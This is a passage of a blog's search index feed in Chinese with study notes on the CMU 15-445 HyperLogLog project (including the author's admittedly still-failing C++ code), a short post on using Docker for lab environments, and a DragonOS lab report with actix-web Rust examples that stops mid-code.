<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CMU15-445_Project0</title>
      <link href="/2025/03/19/CMU15_445_Project0/"/>
      <url>/2025/03/19/CMU15_445_Project0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>早在去年的年底就写完了CMU15-445的project0，但是当时写完有几十个Bug，陆陆续续改了一两天之后去忙别的事情了，就一直没有写完，github上找到了之前提交的新分支，准备重头看下题目然后继续快速的通过这个project0，个人认为这个Project0出得还是很有新意，和之前的什么字典树，前缀树之类的数据结构有较大区别，这是一个Probablistic data structure 一种概率数据结构。</p></blockquote><h2 id="Project-Specification"><a href="#Project-Specification" class="headerlink" title="Project Specification"></a>Project Specification</h2><h3 id="项目官网"><a href="#项目官网" class="headerlink" title="项目官网"></a><a href="https://15445.courses.cs.cmu.edu/fall2024/project0/">项目官网</a></h3><h3 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h3><p>目的：Keeping track of the number of unique users accessing a website in a single day .</p><p>当对少数人访问的网站直接记录就好了，但是对有数十亿的用户来说要去重就非常的麻烦，所以就产生了HyperLogLog(HLL)这个概率数据结构，以极小的误差计算海量数据流种的唯一项目的数量，不显式存储唯一项目。</p><p>关键变量：</p><ul><li><p>b : 哈希值二进制表示形式中的初始位数</p></li><li><p>m ：设定的桶数，<code>m=2^b</code></p></li><li><p>p ：剩余的哈希位中最左端第一个1的位置</p></li></ul><p>具体样例解释：</p><blockquote><p>Consider a simple example of how this algorithm works using the string <code>&quot;A great database is a great life&quot;</code>. First, the string is hashed to produce a hash value, which is then converted into its binary representation. From the hash value (binary form), <code>b</code> bits are extracted, starting from the most significant bit(MSB). The register value is calculated from the extracted bits. (by default each register has a value of <code>0</code>).<br>考虑一个使用字符串 <code>&quot;A great database is a great life&quot;</code> .首先，对字符串进行哈希处理以生成哈希值，然后将其转换为其二进制表示形式。从哈希值（二进制形式）中提取 <code>b</code> 位，从最高有效位 （MSB） 开始。寄存器值是根据提取的 bits 计算得出的。（默认情况下，每个 register 的值为 <code>0</code>）。</p><p>From the remaining set of bits, the position of the leftmost 1 is obtained (MSB), i.e the number of leading zeros from left plus 1 (as given in the picture given below).<br>从剩余的一组位中，获得最左边的 1 的位置 （MSB），即从左边开始的前导零加 1 的数量（如下图所示）。</p><p><img src="/./CMU15-445_Project0.assets/hll-example.png" alt="HLL"></p><p>After this, using the <code>b</code> bits, the register value is calculated (which in the above case it’s 6). Hence, in register 6, <code>max(register[6], p)</code> will be stored.<br>在此之后，使用 <code>b</code> 位计算 register 值（在上述情况下为 6）。因此，在寄存器 6 中，<code>将存储 max（register[6]， p）。</code></p><p><img src="/./CMU15-445_Project0.assets/registers1.png" alt="HLL"></p><p>Another value in a set may have p &#x3D; 2 in register 3, hence 2 will be stored in register 3.<br>一组中的另一个值可能在寄存器 3 中具有 p &#x3D; 2，因此 2 将存储在寄存器 3 中。</p><p><img src="/./CMU15-445_Project0.assets/registers2.png" alt="HLL"></p><p>Now, another element in a set has p &#x3D; 2 in register 6. Hence, <code>max(register[6], p) –&gt; max(5, 2)</code> will be stored in register 6.<br>现在，集合中的另一个元素在寄存器 6 中具有 p &#x3D; 2。因此， <code>max(register[6], p) –&gt; max(5, 2)</code> 将存储在寄存器 6 中。</p><p><img src="/./CMU15-445_Project0.assets/registers2.png" alt="HLL"></p><p>Similarly, another element having p &#x3D; 4 in register 3, <code>max(register[3], p) –&gt; max (2, 4)</code> will be stored in register 3.<br>同样，寄存器 3 中 p &#x3D; 4 的另一个元素 <code>max(register[3], p) –&gt; max (2, 4)</code> 将存储在寄存器 3 中。</p><p><img src="/./CMU15-445_Project0.assets/registers3.png" alt="HLL"></p><p>After all the elements in the set have been added, cardinality is calculated in the following manner.<br>添加集合中的所有元素后，按以下方式计算基数。</p><p>If there are total of <code>m</code> registers, then:<br>如果总共有 <code>m</code> 个 registers，则：</p><p><img src="/./CMU15-445_Project0.assets/cardinality.png" alt="HLL"></p><p>where <code>constant = 0.79402</code> and <code>R[j]</code> is the value in register <code>j</code> and <code>N = m</code>.<br>其中 <code>constant = 0.79402</code> 和 <code>R[j]</code> 是寄存器 <code>j</code> 和 <code>N = m</code> 中的值。</p></blockquote><p>文章中解释的很清楚，这里就不多赘述了，只明确几个点：</p><ul><li>一共的桶数为m，根据b个二进制数一共能得到2^b个组合得出的m，所以在概率上所有桶是等概率的获得数字、</li><li>这个概率型数据结构的证明不属于本篇博文的讨论范围，故略过，教程中有Resources介绍其证明及实现HLL的博客。</li></ul><h3 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h3><p><strong><code>Task1</code>将用最左边的1的位置作为p，<code>Task2</code>将使用最右边的连续零的个数作为p存储在寄存器中。</strong> </p><h2 id="Instructions"><a href="#Instructions" class="headerlink" title="Instructions"></a>Instructions</h2><h3 id="Task1-实现基本的HLL数据结构"><a href="#Task1-实现基本的HLL数据结构" class="headerlink" title="Task1:实现基本的HLL数据结构"></a>Task1:实现基本的HLL数据结构</h3><blockquote><p>In <code>hyperloglog.h</code>, following functions have to be implemented:<br>在 <code>hyperloglog.h</code> 中，必须实现以下功能：</p><ul><li><code>HyperLogLog(inital_bits)</code>: a constructor where a number of leading bits (b) is provided.<br> <code>HyperLogLog（inital_bits）：</code>一个构造函数，其中提供了多个前导位 （b）。</li><li><code>GetCardinality()</code>: returns the cardinality value of a given set<br> <code>GetCardinality（）：</code>返回给定集的基数值</li><li><code>AddElem(val)</code>: computes and places the value in the register.<br> <code>AddElem（val）：</code>计算值并将其放入寄存器中。</li><li><code>ComputeCardinality()</code>: computes the cardinality based on the above formula.<br> <code>ComputeCardinality（）：</code>根据上述公式计算基数。</li></ul><p>Along with it, you can implement helper functions to implement the above (can add more as per requirement):<br>除此之外，您还可以实现辅助函数来实现上述内容（可以根据要求添加更多）：</p><ul><li><code>ComputeBinary(hash_t hash)</code>: It computes a binary of a given hash value. The hash value should be converted to a 64 bit binary stream (otherwise tests may fail).<br> <code>ComputeBinary（hash_t hash）：</code>计算给定哈希值的二进制文件。哈希值应转换为 64 位二进制流（否则测试可能会失败）。</li><li><code>PositionOfLeftmostOne(....)</code>: it computes the position of the leftmost 1.<br> <code>PositionOfLeftmostOne（....）</code>：它计算最左边的 1 的位置。</li></ul><p>For calculating hash, you can use the given function:<br>要计算哈希值，您可以使用给定的函数：</p><ul><li><code>CalculateHash(...)</code> - to calculate hash<br> <code>CalculateHash（...）</code>- 计算哈希</li></ul><p>Please refer to the <code>std::bitset</code> library for storing in binary representation. When a value is obtained in decimal, convert into a greatest integer <strong>less than or equal to</strong> the decmial. Refer <code>std::floor</code> for more details.<br>请参考 <code>std：：bitset</code> 库以二进制表示形式存储。当获得以十进制为单位的值时，转换为<strong>小于或等于</strong>十进制的最大整数。有关更多详细信息，请参阅 <code>std：：floor</code></p></blockquote><p>可以简单的发现，这几个函数的最终作用就是读取字符串，转换哈希串，转化成二进制字符串，按位处理，存入vector，所以可以轻易的写出代码：</p><p>在这里只展示<code>hyperLogLog.cpp</code></p><h4 id="基本代码"><a href="#基本代码" class="headerlink" title="基本代码"></a>基本代码</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"primer/hyperloglog.h"</span></span><span class="token keyword">namespace</span> bustub <span class="token punctuation">&#123;</span><span class="token comment">/** @brief Parameterized constructor. */</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">KeyType</span><span class="token operator">></span><span class="token class-name">HyperLogLog</span><span class="token operator">&lt;</span>KeyType<span class="token operator">></span><span class="token double-colon punctuation">::</span><span class="token function">HyperLogLog</span><span class="token punctuation">(</span><span class="token keyword">int16_t</span> n_bits<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">cardinality_</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>n_bits <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> n_bits <span class="token operator">></span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> std<span class="token double-colon punctuation">::</span><span class="token function">invalid_argument</span><span class="token punctuation">(</span><span class="token string">"n_bits must be between 1 and 64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">this</span><span class="token operator">-></span>n_bits <span class="token operator">=</span> n_bits<span class="token punctuation">;</span> <span class="token comment">//   BITSET_CAPACITY = n_bits;//应该是不能改这个的</span>    <span class="token keyword">this</span><span class="token operator">-></span>registers_<span class="token operator">=</span>std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">uint64_t</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>n_bits<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  bitset_<span class="token operator">=</span>std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">bitset</span><span class="token generic class-name"><span class="token operator">&lt;</span>BITSET_CAPACITY<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * @brief Function that computes binary. * * @param[in] hash * @returns binary of a given hash */</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">KeyType</span><span class="token operator">></span><span class="token keyword">auto</span> <span class="token class-name">HyperLogLog</span><span class="token operator">&lt;</span>KeyType<span class="token operator">></span><span class="token double-colon punctuation">::</span><span class="token function">ComputeBinary</span><span class="token punctuation">(</span><span class="token keyword">const</span> hash_t <span class="token operator">&amp;</span>hash<span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token operator">-></span> std<span class="token double-colon punctuation">::</span>bitset<span class="token operator">&lt;</span>BITSET_CAPACITY<span class="token operator">></span> <span class="token punctuation">&#123;</span>  <span class="token comment">/** @TODO(student) Implement this function! */</span> <span class="token keyword">return</span>  std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">bitset</span><span class="token generic class-name"><span class="token operator">&lt;</span>BITSET_CAPACITY<span class="token operator">></span></span></span><span class="token punctuation">(</span>hash<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">/** * @brief Function that computes leading zeros. * * @param[in] bset - binary values of a given bitset * @returns leading zeros of given binary set */</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">KeyType</span><span class="token operator">></span><span class="token keyword">auto</span> <span class="token class-name">HyperLogLog</span><span class="token operator">&lt;</span>KeyType<span class="token operator">></span><span class="token double-colon punctuation">::</span><span class="token function">PositionOfLeftmostOne</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>bitset<span class="token operator">&lt;</span>BITSET_CAPACITY<span class="token operator">></span> <span class="token operator">&amp;</span>bset<span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token operator">-></span> <span class="token keyword">uint64_t</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/** @TODO(student) Implement this function! */</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span> i <span class="token operator">=</span> <span class="token generic-function"><span class="token function">static_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">uint64_t</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>BITSET_CAPACITY<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">uint16_t</span><span class="token punctuation">)</span>n_bits<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">></span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//bset.test是从最右边开始遍历</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bset<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span>BITSET_CAPACITY<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">uint16_t</span><span class="token punctuation">)</span>n_bits<span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">/** * @brief Adds a value into the HyperLogLog. * * @param[in] val - value that's added into hyperloglog */</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">KeyType</span><span class="token operator">></span><span class="token keyword">auto</span> <span class="token class-name">HyperLogLog</span><span class="token operator">&lt;</span>KeyType<span class="token operator">></span><span class="token double-colon punctuation">::</span><span class="token function">AddElem</span><span class="token punctuation">(</span>KeyType val<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">void</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/*  数出前面几个b然后把他变成寄存器的位置，然后数出1的位置然后塞进去  */</span> bitset_<span class="token operator">=</span>std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">bitset</span><span class="token generic class-name"><span class="token operator">&lt;</span>BITSET_CAPACITY<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> bitset_<span class="token operator">=</span><span class="token function">ComputeBinary</span><span class="token punctuation">(</span><span class="token function">CalculateHash</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">uint64_t</span> decimal_value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n_bits<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//计算桶的序号数</span>   <span class="token keyword">uint64_t</span> bit_index <span class="token operator">=</span>BITSET_CAPACITY<span class="token operator">-</span>n_bits<span class="token operator">+</span>i<span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>bitset_<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>bit_index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     decimal_value<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token number">1ull</span> <span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//左移i位</span>   <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">uint64_t</span> positionlt_value <span class="token operator">=</span> <span class="token function">PositionOfLeftmostOne</span><span class="token punctuation">(</span>bitset_<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//计算除去桶左边第一个1的位置</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>registers_<span class="token punctuation">[</span>decimal_value<span class="token punctuation">]</span><span class="token operator">&lt;</span>positionlt_value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    registers_<span class="token punctuation">[</span>decimal_value<span class="token punctuation">]</span><span class="token operator">=</span>positionlt_value<span class="token punctuation">;</span>  <span class="token comment">/** @TODO(student) Implement this function! */</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * @brief Function that computes cardinality. */</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">KeyType</span><span class="token operator">></span><span class="token keyword">auto</span> <span class="token class-name">HyperLogLog</span><span class="token operator">&lt;</span>KeyType<span class="token operator">></span><span class="token double-colon punctuation">::</span><span class="token function">ComputeCardinality</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">void</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>n_bits<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  middle_pow_sum<span class="token operator">+=</span>std<span class="token double-colon punctuation">::</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span>registers_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  middle_pow_sum<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1.0</span><span class="token operator">*</span>CONSTANT<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>n_bits<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>n_bits<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span>middle_pow_sum<span class="token punctuation">;</span>  cardinality_<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span><span class="token function">floor</span><span class="token punctuation">(</span>middle_pow_sum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//向下取整</span>    <span class="token comment">// /** @TODO(student) Implement this function! */</span><span class="token punctuation">&#125;</span><span class="token keyword">template</span> <span class="token keyword">class</span> <span class="token class-name">HyperLogLog</span><span class="token operator">&lt;</span><span class="token keyword">int64_t</span><span class="token operator">></span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token keyword">class</span> <span class="token class-name">HyperLogLog</span><span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>string<span class="token operator">></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token comment">// namespace bustub</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="全面报错"><a href="#全面报错" class="headerlink" title="全面报错"></a>全面报错</h4><p>发现一个测试点都没过，于是开始漫长的debug，因为不知道怎么debug高效，只能修改测试样例，看输出符不符合，现在还在尝试，可能之后用gdb来debug，虽然之前用过</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> CMU15-445 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker-做实验的正确姿势</title>
      <link href="/2025/03/18/Docker_Do_Lab/"/>
      <url>/2025/03/18/Docker_Do_Lab/</url>
      
        <content type="html"><![CDATA[<blockquote><p>近几日在配MIT6.s081和CS15-445的环境，本来是想着所有的环境都配到实验室主机上面，然后发现这样子容易导致各种环境的混乱，突然间想到了之前就下载过别人的Docker Images来做实验，一键配置。想到了Docker可以快速的创建不同版本的Ubuntu容器，隔离不同的开发环境，还能轻松件简单的附加到VisualStudioCode上编辑，摸索了一阵子，发现还能在之后把环境直接打包发到DockerHub上给后人使用，也能训练自己对Docker命令的使用，一石N鸟，何乐而不为？</p></blockquote><h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><p>关于这个我在<a href="https://vitus213.github.io/EATPOOP/docker_use/">这里</a>写过一些，可以参考下，这里就不多赘述了。</p><h2 id="Docker创建"><a href="#Docker创建" class="headerlink" title="Docker创建"></a>Docker创建</h2><ul><li>拉取实验对应的系统镜像</li><li>创建容器</li><li>使用Docker attach命令附加容器</li><li>配置实验环境</li><li>映射到本地文件夹或者直接附加到VisualStudioCode上进行代码编写</li></ul><h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><p>主要是给大家提供一个做实验的新思路，过程就不多赘述了，认为配环境只是一个Lab最旁枝末节的东西，笔者曾经有段时间热衷于配置环境，现已幡然醒悟。在大家配环境配美化的时候请大家记住环境能用就行不要本末倒置！记住你打开电脑最开始是要干什么的！</p>]]></content>
      
      
      <categories>
          
          <category> EATPOOP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DragonOS寒训营lab1</title>
      <link href="/2025/01/19/Week1/"/>
      <url>/2025/01/19/Week1/</url>
      
        <content type="html"><![CDATA[<h1 id="Week1-Report"><a href="#Week1-Report" class="headerlink" title="Week1 Report"></a>Week1 Report</h1><blockquote><p><a href="https://bbs.dragonos.org.cn/t/topic/438/3">Week1发布地址</a></p></blockquote><blockquote><p>这个lab在刚发布那天就搞定了，但是这几日有些忙，现在在家里写这个lab交差，吐槽下下远程连虚拟机好像确实有点卡，可能是网络质量不太好</p></blockquote><h2 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h2><h3 id="lab1-1，2"><a href="#lab1-1，2" class="headerlink" title="lab1-1，2"></a>lab1-1，2</h3><p>简单使用<code>actix-web</code>，写一个用get请求会返回Hello的程序，这里本人直接打开了<code>actix-web</code>的介绍官网，然后抄了给的<code>hello-world</code>的源码改了改了事。</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">actix_web<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span>get<span class="token punctuation">,</span> web<span class="token punctuation">,</span> <span class="token class-name">App</span><span class="token punctuation">,</span> <span class="token class-name">HttpResponse</span><span class="token punctuation">,</span> <span class="token class-name">HttpServer</span><span class="token punctuation">,</span> <span class="token class-name">Responder</span><span class="token punctuation">,</span><span class="token namespace">http<span class="token punctuation">::</span></span>header<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token attribute attr-name">#[get(<span class="token string">"/hello"</span>)]</span><span class="token keyword">async</span> <span class="token keyword">fn</span> <span class="token function-definition function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">impl</span> <span class="token class-name">Responder</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HttpResponse</span><span class="token punctuation">::</span><span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">"Hello world!\n"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[get(<span class="token string">"/echo/your_name"</span>)]</span><span class="token keyword">async</span> <span class="token keyword">fn</span> <span class="token function-definition function">echo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">impl</span> <span class="token class-name">Responder</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HttpResponse</span><span class="token punctuation">::</span><span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">"Hello your_name!\n"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">fn</span> <span class="token function-definition function">manual_hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">impl</span> <span class="token class-name">Responder</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HttpResponse</span><span class="token punctuation">::</span><span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">"Hey"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[actix_web::main]</span><span class="token keyword">async</span> <span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HttpServer</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">App</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">service</span><span class="token punctuation">(</span>hello<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">service</span><span class="token punctuation">(</span>echo<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">"/hey"</span><span class="token punctuation">,</span> <span class="token namespace">web<span class="token punctuation">::</span></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">to</span><span class="token punctuation">(</span>manual_hello<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span>    <span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">await</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>模拟运行结果如图：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202501192104409.png" alt="image-20250119190225438"></p><h3 id="lab1-3"><a href="#lab1-3" class="headerlink" title="lab1-3"></a>lab1-3</h3><p>添加个<code>CORS</code>主要目的是了解<code>CORS</code>的功能和概念，为后面使用<code>SwaggerUi</code>做铺垫.</p><p>修改版代码</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">actix_web<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span>get<span class="token punctuation">,</span> web<span class="token punctuation">,</span> <span class="token class-name">App</span><span class="token punctuation">,</span> <span class="token class-name">HttpResponse</span><span class="token punctuation">,</span> <span class="token class-name">HttpServer</span><span class="token punctuation">,</span> <span class="token class-name">Responder</span><span class="token punctuation">,</span><span class="token namespace">http<span class="token punctuation">::</span></span>header<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">actix_cors<span class="token punctuation">::</span></span><span class="token class-name">Cors</span><span class="token punctuation">;</span><span class="token attribute attr-name">#[get(<span class="token string">"/hello"</span>)]</span><span class="token keyword">async</span> <span class="token keyword">fn</span> <span class="token function-definition function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">impl</span> <span class="token class-name">Responder</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HttpResponse</span><span class="token punctuation">::</span><span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">"Hello world!\n"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[get(<span class="token string">"/echo/your_name"</span>)]</span><span class="token keyword">async</span> <span class="token keyword">fn</span> <span class="token function-definition function">echo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">impl</span> <span class="token class-name">Responder</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HttpResponse</span><span class="token punctuation">::</span><span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">"Hello your_name!\n"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">fn</span> <span class="token function-definition function">manual_hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">impl</span> <span class="token class-name">Responder</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HttpResponse</span><span class="token 